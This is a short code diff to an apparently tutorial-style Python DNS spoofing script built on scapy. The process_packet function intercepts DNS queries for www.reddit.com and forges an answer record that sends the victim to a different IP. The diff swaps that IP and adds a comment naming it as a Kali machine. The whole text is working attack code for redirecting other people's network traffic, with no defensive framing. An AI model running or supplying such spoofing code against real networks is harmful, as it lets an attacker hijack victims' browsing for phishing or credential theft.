@@ -7,7 +7,8 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
         if "www.reddit.com" in str(qname):
             print("[+] Spoofing target..")
-            answer = scapy.DNSRR(rrname=qname, rdata="192.168.0.83")
+            answer = scapy.DNSRR(rrname=qname, rdata="1.2.3.4")
+            # rdata = kali machine
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
